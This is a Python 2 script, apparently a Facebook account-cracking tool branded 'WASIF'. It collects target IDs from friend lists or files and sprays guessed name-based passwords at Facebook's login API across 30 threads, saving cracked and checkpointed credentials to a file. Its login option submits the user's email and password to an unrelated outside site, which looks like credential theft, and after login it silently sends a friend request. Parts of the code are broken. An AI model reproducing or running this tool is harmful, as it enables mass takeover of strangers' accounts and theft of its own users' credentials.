#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')





def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;97mToken\033[1;91m : \033[1;95mCopy👉 \033[1;92mEAAAAUaZA8jlABAEZBmW0yH8w0R2XhpqqNiaQvKDkm1wCFazEcrJEzJThJrjZC3fuBFP6DFNmNnZB8ueUyVZCH7zPMulcTHZBa9ZCRHTTRTc0wneLqx5BZBruQbJQAx5pssqNnZB9qH6oHFjqWJf0yoOFkawm7hDqVYM8wCALx4xv7hi4ERoBPpgSGKAsm95Xt8fcZD \033[1;96m👈 Without fb ID free login Copy Paste & Enter👉\033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		Name = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			#Loding Funcation :)
def baba(word):
    lix = ["[\033[1;92m■\033[1;97m□□□□□□□□□□□□□]","[\033[1;93m■■\033[1;97m□□□□□□□□□□□□]", "[\033[1;94m■■■\033[1;97m□□□□□□□□□□□]", "[\033[1;96m■■■■\033[1;97m□□□□□□□□□□]", "[\033[1;95m■■■■■\033[1;97m□□□□□□□□□]", "[\033[1;97m■■■■■■\033[1;97m□□□□□□□□]", "[\033[1;93m■■■■■■■\033[1;97m□□□□□□□]", "[\033[1;91m■■■■■■■■\033[1;97m□□□□□□]", "[\033[1;96m■■■■■■■■■\033[1;97m□□□□□]", "[\033[1;92m■■■■■■■■■■\033[1;97m□□□□]", "[\033[1;94m■■■■■■■■■■■\033[1;97m□□□]", "[\033[1;95m■■■■■■■■■■■■\033[1;97m□□]", "[\033[1;93m■■■■■■■■■■■■■\033[1;97m□]", "[\033[1;92m■■■■■■■■■■■■■■\033[1;97m]"]
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.09)
            sys.stdout.flush()


##### LOGO #####
logo = """
\033[1;97m
▒█░░░▄░░▒█░░▄█▀▄─▒▄█▀▀█▐██░▐█▀▀
▒█░░▒█░░▒█░▐█▄▄▐█▒▀▀█▄▄░█▌░▐█▀▀
░▒▀▄▀▒▀▄▀░░▐█─░▐█▒█▄▄█▀▐██░▐█──
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
||\033[0;97\033[0;41mWELCOME TO WASIF CREATION
||\033[0;97m\033[0;42mWhatsaap ||03451772008
||\033[0;97m\033[0;44mCreated \033[1;97mBy \033[1;93mWASIF
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"""
def home(): 
  os.system("clear")
    print logo 
    print 47*("-")
    baba("   Bypass Processing => ")
    os.system("clear")
    print logo
    

    
    

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"



####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;96m Login With Facebook  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m2.\x1b[1;95m Login With Token"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m3.\x1b[1;93m CONTECT ME ON WHATSAPP "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://hevtech.xyz')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("\033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account")
		jalan("\033[1;91mWarning  \033[1;92mUse a New Account To Login")
		print('\033[1;97m\x1b[1;96m................LOGIN WITH FACEBOOK................\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;93mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;93mPassword      \x1b[1;93m: \x1b[1;92m')
		tik()
		try:
			br.open('https://hevtech.xyz')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://www.facebook.com/MOHSIN.ALI.ALL.HATERX.KA.PAPA.FEEL.THE.POWER')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		Name = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:wasif
        time.sleep(0.05)
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mwasif\033[1;96m•◈•───────────────•◈•"
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;97m"+Name+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;97m"+id+"\x1b[1;97m              "
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mwasif\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;93m1\x1b[1;96m]\x1b[1;93m Hack Facebook Account"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Remove The Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m▰▰▰▰▰▰▰▰▰▰▰▰\033[1;92mwasifhacker\033[1;96m▰▰▰▰▰▰▰▰▰▰▰▰"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;93mHACK WITH FRIEND LIST"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;93mHACK WITH PUBLIC ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \033[1;93mHACK WITH FILE"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m] \033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m•▰▰▰▰▰▰▰▰▰▰▰▰•\033[1;92m☠️wasif☠️\033[1;96m•▰▰▰▰▰▰▰▰▰▰▰▰•"
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m•▰▰▰▰▰▰▰▰▰▰▰▰•\033[1;92mwk\033[1;96m•▰▰▰▰▰▰▰▰▰▰▰▰•"
		idt = raw_input("\033[1;96m[+] \033[1;37mEnter ID Code \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mFriend Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mFriend List Public Nahi Hain!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print "\033[1;96m▰▰▰▰▰▰▰▰▰▰▰▰\033[1;92mwk hacker\033[1;96m▰▰▰▰▰▰▰▰▰▰▰▰"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile Nai Milli'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	time.sleep(0.05)
	jalan('\033[1;96m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
		time.sleep(0.05)
	print
	print('\x1b[1;96m[!] \033[1;92mStop CTRL+z')
	time.sleep(0.05)
	print "\033[1;96m▰▰▰▰▰▰▰▰▰▰▰▰\033[1;92m☠️💪Wasif☠️💪\033[1;96m▰▰▰▰▰▰▰▰▰▰▰▰"
	print ('\033[1;96m[\033[1;92mO\033[1;93mR\033[1;96m]  \033[1;93m    User ID    \033[1;96m| \033[1;93mPassword \033[1;96m  - \033[1;93m ID Name')
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mwasif hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mwasif Cp\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b[ 'last_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mwasif hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mwasifCp\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mwasif hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mwasif Cp\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mwasu hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mwasifCp\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'1122'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mwasifCp\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mwasif hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name']+'1122'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mwasifhacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mwasif CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name']+'786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mwasif hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mwasu CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name']+'786'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[1;96m[\x1b[1;92mwasifhacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[1;96m[\x1b[1;93musmanCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
																			cek = open("out/super_cp.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = b['first_name']+'12345'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\x1b[1;96m[\x1b[1;92muzair hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print '\x1b[1;96m[\x1b[1;93myasir CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
																					cek = open("out/super_cp.txt", "a")
																					cek.write(user+"|"+pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					pass10 = b['last_name']+'12345'
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;96m[\x1b[1;92msajjad hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q["error_msg"]:
																							print '\x1b[1;96m[\x1b[1;93mfaisal CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
																							cek = open("out/super_cp.txt", "a")
																							cek.write(user+"|"+pass10+"\n")
																							cek.close()
																							cekpoint.append(user+pass10)
																						else:
																							pass11 = ('786786')
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print '\x1b[1;96m[\x1b[1;92mawais hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
																								oks.append(user+pass11)
																							else:
																								if 'www.facebook.com' in q["error_msg"]:
																									print '\x1b[1;96m[\x1b[1;93mhashir CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
																									cek = open("out/super_cp.txt", "a")
																									cek.write(user+"|"+pass11+"\n")
																									cek.close()
																									cekpoint.append(user+pass11)
																								else:
																									pass12 = ('000786')
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print '\x1b[1;96m[\x1b[1;92mAlyan hacked\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
																										oks.append(user+pass12)
																									else:
																										if 'www.facebook.com' in q["error_msg"]:
																											print '\x1b[1;96m[\x1b[1;93marman CP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
																											cek = open("out/super_cp.txt", "a")
																											cek.write(user+"|"+pass12+"\n")
																											cek.close()
																											cekpoint.append(user+pass12)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mwasif hacker☠️☠️\033[1;96m•◈•───────────────•◈•"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Complete \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal wasif hacked/\x1b[1;93mwasif CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	super()
	
if __name__ == '__main__':
	login()
